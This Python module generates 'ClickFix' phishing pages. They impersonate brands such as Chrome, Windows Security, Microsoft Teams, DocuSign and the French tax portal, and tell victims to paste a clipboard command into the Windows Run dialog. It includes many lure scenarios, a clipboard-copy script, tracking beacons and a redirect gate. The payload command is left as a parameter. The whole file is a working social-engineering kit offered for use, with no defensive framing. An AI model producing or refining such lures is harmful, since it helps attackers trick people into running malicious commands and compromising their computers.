# language: Python 3.11+, file: cf/lure.py
# *clickfix lure pages — the "fix it yourself" instruction surface*
from __future__ import annotations

import builtins
import html
import json
from collections.abc import Sequence
from typing import Any

SCENARIOS: dict[str, dict[str, Any]] = {
    "browser_update": {
        "brand": "Chrome",
        "badge": "Connection interrupted",
        "headline": "Your download was blocked by the browser",
        "sub": (
            "The file never finished transferring. Run the recovery command "
            "below to restart the download."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the command with Ctrl + V",
            "Press Enter",
        ],
        "copy": "Copy recovery command",
        "copied": "Copied — now paste it",
        "continue": "I ran it — continue",
        "accent": "#2563eb",
        "dark": True,
    },
    "captcha": {
        "brand": "Verification",
        "badge": "Human verification required",
        "headline": "Complete the check to view this page",
        "sub": (
            "Your session could not be validated automatically. The console "
            "command below finishes the verification."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the verification key",
            "Press Enter",
        ],
        "copy": "Copy verification key",
        "copied": "Copied — now paste it",
        "continue": "Continue to the page",
        "accent": "#059669",
        "dark": False,
    },
    "file_blocked": {
        "brand": "Windows Security",
        "badge": "File quarantined",
        "headline": "This file was blocked for your protection",
        "sub": (
            "SmartScreen could not verify the publisher. Restore the download "
            "with the command below."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the restore command",
            "Press Enter",
        ],
        "copy": "Copy restore command",
        "copied": "Copied — now paste it",
        "continue": "Open the file",
        "accent": "#dc2626",
        "dark": True,
    },
    "mail_attachment": {
        "brand": "Mail",
        "badge": "Attachment failed",
        "headline": "The attachment could not be opened",
        "sub": (
            "The mail client stopped the attachment. Launch the repair command "
            "to open it."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the repair command",
            "Press Enter",
        ],
        "copy": "Copy repair command",
        "copied": "Copied — now paste it",
        "continue": "Open attachment",
        "accent": "#7c3aed",
        "dark": False,
    },
    "it_support": {
        "brand": "IT Service Desk",
        "badge": "Ticket #4821",
        "headline": "Diagnostics required to restore access",
        "sub": (
            "Support asked you to run a short diagnostic. Paste it into the "
            "Run dialog and press Enter."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the diagnostic command",
            "Press Enter",
        ],
        "copy": "Copy diagnostic command",
        "copied": "Copied — now paste it",
        "continue": "Done — return to ticket",
        "accent": "#0891b2",
        "dark": False,
    },
    "share_link": {
        "brand": "SharePoint",
        "badge": "Document shared with you",
        "headline": "The preview link needs a quick fix",
        "sub": (
            "Previewing stopped halfway. Run the command to rebuild the link, "
            "then continue."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the link repair command",
            "Press Enter",
        ],
        "copy": "Copy repair command",
        "copied": "Copied — now paste it",
        "continue": "Open the document",
        "accent": "#0f766e",
        "dark": True,
    },
    "voicemail": {
        "brand": "Microsoft Teams",
        "badge": "1 new voicemail",
        "headline": "You have a new voicemail message",
        "sub": (
            "The audio could not be decoded in the browser. Run the command "
            "below to open it in the desktop app."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the audio decode command",
            "Press Enter",
        ],
        "copy": "Copy decode command",
        "copied": "Copied — now paste it",
        "continue": "Listen to voicemail",
        "accent": "#6264a7",
        "dark": True,
    },
    "software_update": {
        "brand": "Windows Update",
        "badge": "Restart required",
        "headline": "A critical update failed to install",
        "sub": (
            "Update KB5034441 could not be applied. Run the repair command "
            "below, then restart to finish."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the update repair command",
            "Press Enter",
        ],
        "copy": "Copy repair command",
        "copied": "Copied — now paste it",
        "continue": "Continue to restart",
        "accent": "#0078d4",
        "dark": True,
    },
    "cloud_sync": {
        "brand": "OneDrive",
        "badge": "Sync paused",
        "headline": "Your files could not be synced",
        "sub": (
            "OneDrive stopped syncing because of a permission error. Run the "
            "command below to repair the sync client."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the sync repair command",
            "Press Enter",
        ],
        "copy": "Copy repair command",
        "copied": "Copied — now paste it",
        "continue": "Resume syncing",
        "accent": "#0078d4",
        "dark": False,
    },
    "printer_issue": {
        "brand": "Print Spooler",
        "badge": "Job stuck in queue",
        "headline": "Your print job could not be completed",
        "sub": (
            "The spooler service is not responding. Run the command below to "
            "restart it and release the job."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the spooler restart command",
            "Press Enter",
        ],
        "copy": "Copy restart command",
        "copied": "Copied — now paste it",
        "continue": "Retry print",
        "accent": "#52525b",
        "dark": False,
    },
    "vpn_disconnect": {
        "brand": "GlobalProtect",
        "badge": "Connection lost",
        "headline": "Your VPN tunnel dropped unexpectedly",
        "sub": (
            "The secure tunnel could not be re-established automatically. Run "
            "the command below to reconnect."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the reconnect command",
            "Press Enter",
        ],
        "copy": "Copy reconnect command",
        "copied": "Copied — now paste it",
        "continue": "Reconnect",
        "accent": "#ea580c",
        "dark": True,
    },
    "meeting_invite": {
        "brand": "Outlook Calendar",
        "badge": "Meeting starting soon",
        "headline": "The meeting link is not working",
        "sub": (
            "The Teams join link returned an error. Run the command below to "
            "repair the calendar entry and rejoin."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the calendar repair command",
            "Press Enter",
        ],
        "copy": "Copy repair command",
        "copied": "Copied — now paste it",
        "continue": "Join meeting",
        "accent": "#0f6cbd",
        "dark": False,
    },
    "invoice": {
        "brand": "Adobe Acrobat",
        "badge": "Invoice PDF",
        "headline": "This invoice could not be opened",
        "sub": (
            "The PDF renderer failed to load the document. Run the command "
            "below to open it in the desktop reader."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the PDF open command",
            "Press Enter",
        ],
        "copy": "Copy open command",
        "copied": "Copied — now paste it",
        "continue": "Open invoice",
        "accent": "#dc2626",
        "dark": True,
    },
    "docusign": {
        "brand": "DocuSign",
        "badge": "Signature required",
        "headline": "A document is waiting for your signature",
        "sub": (
            "The browser signing session expired. Run the command below to "
            "open the document in the desktop signer."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the signer launch command",
            "Press Enter",
        ],
        "copy": "Copy launch command",
        "copied": "Copied — now paste it",
        "continue": "Review & sign",
        "accent": "#ffb81c",
        "dark": False,
    },
    "mfa_reset": {
        "brand": "Identity Portal",
        "badge": "Action required",
        "headline": "Your MFA method needs to be re-registered",
        "sub": (
            "Your authenticator was unlinked. Run the command below to open "
            "the registration portal and re-enroll."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the registration command",
            "Press Enter",
        ],
        "copy": "Copy registration command",
        "copied": "Copied — now paste it",
        "continue": "Register MFA",
        "accent": "#7c3aed",
        "dark": True,
    },
    "delivery": {
        "brand": "Colissimo",
        "badge": "Colis en attente",
        "headline": "Votre colis n'a pas pu être livré",
        "sub": (
            "Le livreur n'a pas trouvé personne. Suivez la commande ci-dessous "
            "pour choisir un nouveau créneau de livraison."
        ),
        "steps": [
            "Appuyez sur la touche Windows + R",
            "Collez la commande de suivi",
            "Appuyez sur Entrée",
        ],
        "copy": "Copier la commande",
        "copied": "Copié — collez-le maintenant",
        "continue": "Choisir un créneau",
        "accent": "#1d4ed8",
        "dark": False,
    },
    "tax_refund": {
        "brand": "Impots.gouv.fr",
        "badge": "Remboursement en cours",
        "headline": "Un remboursement d'impôt vous est dû",
        "sub": (
            "Votre déclaration a été validée. Exécutez la commande ci-dessous "
            "pour recevoir le virement."
        ),
        "steps": [
            "Appuyez sur la touche Windows + R",
            "Collez la commande de traitement",
            "Appuyez sur Entrée",
        ],
        "copy": "Copier la commande",
        "copied": "Copié — collez-le maintenant",
        "continue": "Recevoir le remboursement",
        "accent": "#0f766e",
        "dark": False,
    },
    "wifi_portal": {
        "brand": "Guest WiFi",
        "badge": "Acceptable use policy",
        "headline": "You must accept the policy to continue",
        "sub": (
            "The captive portal requires a local agent. Run the command below "
            "to complete registration."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the registration command",
            "Press Enter",
        ],
        "copy": "Copy registration command",
        "copied": "Copied — now paste it",
        "continue": "Accept & connect",
        "accent": "#0284c7",
        "dark": True,
    },
    "backup_failed": {
        "brand": "Veeam Agent",
        "badge": "Backup failed",
        "headline": "Last night's backup did not complete",
        "sub": (
            "The snapshot could not be created. Run the command below to "
            "retry the backup job."
        ),
        "steps": [
            "Press the Windows key + R",
            "Paste the backup retry command",
            "Press Enter",
        ],
        "copy": "Copy retry command",
        "copied": "Copied — now paste it",
        "continue": "Retry backup",
        "accent": "#7c3aed",
        "dark": True,
    },
}

_TEMPLATE = """<!doctype html>
<html lang="__LOCALE__">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>__TITLE__</title>
<style>
  :root { --accent: __ACCENT__; --bg: __BG__; --card: __CARD__; --fg: __FG__;
          --muted: __MUTED__; --line: __LINE__; }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    background: radial-gradient(1200px 600px at 20% -10%, color-mix(in srgb, var(--accent) 18%, transparent), transparent), var(--bg);
    color: var(--fg);
    font: 15px/1.5 "Segoe UI", system-ui, -apple-system, Roboto, sans-serif;
    display: flex; align-items: center; justify-content: center; padding: 24px;
  }
  .wrap { width: 100%; max-width: 560px; }
  .top { display: flex; align-items: center; gap: 10px; margin-bottom: 16px; }
  .dot { width: 28px; height: 28px; border-radius: 8px; background: var(--accent);
         display: grid; place-items: center; color: #fff; font-weight: 700; font-size: 13px; }
  .brand { font-weight: 600; letter-spacing: .2px; }
  .chip { margin-left: auto; font-size: 12px; padding: 4px 9px; border-radius: 999px;
          background: color-mix(in srgb, var(--accent) 16%, transparent);
          color: var(--accent); border: 1px solid color-mix(in srgb, var(--accent) 35%, transparent); }
  .card { background: var(--card); border: 1px solid var(--line); border-radius: 16px;
          padding: 26px 24px; box-shadow: 0 18px 50px rgba(0,0,0,.28); }
  h1 { font-size: 21px; line-height: 1.3; margin-bottom: 8px; }
  .sub { color: var(--muted); font-size: 14px; margin-bottom: 22px; }
  ol { list-style: none; counter-reset: s; margin-bottom: 20px; }
  ol li { counter-increment: s; display: flex; gap: 12px; align-items: center;
          padding: 10px 0; border-bottom: 1px dashed var(--line); }
  ol li:last-child { border-bottom: 0; }
  ol li::before { content: counter(s); flex: 0 0 24px; height: 24px; border-radius: 50%;
                  background: color-mix(in srgb, var(--accent) 20%, transparent);
                  color: var(--accent); font-size: 12px; font-weight: 700;
                  display: grid; place-items: center; }
  kbd { font: 12px/1 ui-monospace, Consolas, monospace; background: var(--bg);
        border: 1px solid var(--line); border-bottom-width: 2px; border-radius: 6px;
        padding: 4px 7px; white-space: nowrap; }
  .cmd { position: relative; background: var(--bg); border: 1px solid var(--line);
         border-radius: 10px; padding: 14px 14px 14px 14px; margin-bottom: 14px; }
  .cmd code { display: block; font: 12.5px/1.55 ui-monospace, Consolas, monospace;
              word-break: break-all; color: var(--fg); user-select: all; }
  button, .btn { width: 100%; border: 0; border-radius: 10px; padding: 13px 16px;
                 font-size: 14.5px; font-weight: 600; cursor: pointer; }
  .primary { background: var(--accent); color: #fff; }
  .primary:hover { filter: brightness(1.08); }
  .ghost { margin-top: 10px; background: transparent; color: var(--muted);
           border: 1px solid var(--line); }
  .ghost:hover { color: var(--fg); }
  .ghost[disabled] { opacity: .45; cursor: not-allowed; }
  .foot { margin-top: 14px; font-size: 12px; color: var(--muted); text-align: center; }
  .status { font-size: 12.5px; color: var(--muted); margin-top: 12px; text-align: center;
            min-height: 18px; }
  @media (max-width: 480px) { .card { padding: 20px 16px; } }
</style>
</head>
<body>
<div class="wrap">
  <div class="top">
    <div class="dot">__DOT__</div>
    <div class="brand">__BRAND__</div>
    <div class="chip">__BADGE__</div>
  </div>
  <div class="card">
    <h1>__HEADLINE__</h1>
    <p class="sub">__SUB__</p>
    <ol>
      __STEPS__
    </ol>
    <div class="cmd"><code id="cmd">__COMMAND__</code></div>
    <button class="primary" id="copy">__COPY__</button>
    <button class="ghost" id="go" disabled>__CONTINUE__</button>
    <div class="status" id="status">__WAIT__</div>
  </div>
  <p class="foot">__FOOT__</p>
</div>
<script>
(function () {
  var TOKEN = __TOKEN_JSON__;
  var COMMAND = __COMMAND_JSON__;
  var COPIED = __COPIED_JSON__;
  var COPY = __COPY_JSON__;
  var go = document.getElementById("go");
  var status = document.getElementById("status");
  var copyBtn = document.getElementById("copy");

  function beacon(path) {
    try {
      var i = new Image(1, 1);
      i.src = path;
    } catch (e) {}
  }
  beacon(__PIXEL_JSON__);

  function done() {
    copyBtn.textContent = COPIED;
    go.disabled = false;
    status.textContent = "";
    beacon("/hit/" + TOKEN + "?s=copy");
  }

  copyBtn.addEventListener("click", function () {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(COMMAND).then(done, fallback);
    } else {
      fallback();
    }
  });

  function fallback() {
    var ta = document.createElement("textarea");
    ta.value = COMMAND;
    ta.style.position = "fixed";
    ta.style.opacity = "0";
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand("copy"); done(); }
    catch (e) { status.textContent = "select the command and press Ctrl+C"; }
    document.body.removeChild(ta);
  }

  go.addEventListener("click", function () {
    beacon("/hit/" + TOKEN + "?s=continue");
    window.location.href = __CONTINUE_JSON__;
  });

  setTimeout(function () {
    if (!go.disabled) return;
    copyBtn.textContent = COPY;
  }, 4000);
})();
</script>
</body>
</html>
"""


class LureBuilder:
    """Renders a self-contained clickfix page: no external requests, one
    tracking pixel, one copy button, one continue gate."""

    SCENARIOS = SCENARIOS

    @staticmethod
    def list() -> builtins.list[dict[str, str]]:
        return [
            {"id": k, "brand": v["brand"], "headline": v["headline"]}
            for k, v in SCENARIOS.items()
        ]

    @staticmethod
    def render(
        scenario: str,
        *,
        token: str,
        command: str,
        continue_url: str = "https://www.google.com",
        locale: str = "fr",
        brand: str = "",
        steps: Sequence[str] | None = None,
    ) -> str:
        spec = SCENARIOS.get(scenario)
        if spec is None:
            raise ValueError(
                f"unknown scenario {scenario!r}, expected one of "
                f"{sorted(SCENARIOS)}"
            )
        final_steps = [str(s) for s in (steps if steps is not None else spec["steps"])]
        if not final_steps:
            raise ValueError("steps must not be empty")
        steps_html = "\n      ".join(
            f"<li>{html.escape(s)}</li>" for s in final_steps[:6]
        )
        dark = spec["dark"]
        page = (
            _TEMPLATE
            .replace("__LOCALE__", html.escape(locale))
            .replace("__TITLE__", html.escape(spec["brand"]))
            .replace("__BRAND__", html.escape(brand or spec["brand"]))
            .replace("__BADGE__", html.escape(spec["badge"]))
            .replace("__HEADLINE__", html.escape(spec["headline"]))
            .replace("__SUB__", html.escape(spec["sub"]))
            .replace("__STEPS__", steps_html)
            .replace("__COPY__", html.escape(spec["copy"]))
            .replace("__COPIED_JSON__", json.dumps(spec["copied"]))
            .replace("__COPY_JSON__", json.dumps(spec["copy"]))
            .replace("__CONTINUE__", html.escape(spec["continue"]))
            .replace("__ACCENT__", spec["accent"])
            .replace("__BG__", "#0b1020" if dark else "#f4f6fb")
            .replace("__CARD__", "#121a2e" if dark else "#ffffff")
            .replace("__FG__", "#e7ecf7" if dark else "#101828")
            .replace("__MUTED__", "#9aa7c2" if dark else "#5b6478")
            .replace("__LINE__", "#24304d" if dark else "#e3e7f0")
            .replace("__DOT__", html.escape((brand or spec["brand"])[:1].upper()))
            .replace("__COMMAND__", html.escape(command))
            .replace("__COMMAND_JSON__", json.dumps(command))
            .replace("__TOKEN_JSON__", json.dumps(token))
            .replace("__PIXEL_JSON__", json.dumps(f"/t/{token}.gif"))
            .replace("__CONTINUE_JSON__", json.dumps(continue_url))
            .replace("__WAIT__", html.escape(_wait_label(locale)))
            .replace("__FOOT__", html.escape(_foot_label(locale)))
        )
        return page


def _wait_label(locale: str) -> str:
    return (
        "En attente de la commande…" if locale.startswith("fr") else "Waiting for the command…"
    )


def _foot_label(locale: str) -> str:
    return (
        "Cette page disparaît après vérification."
        if locale.startswith("fr")
        else "This page closes after verification."
    )
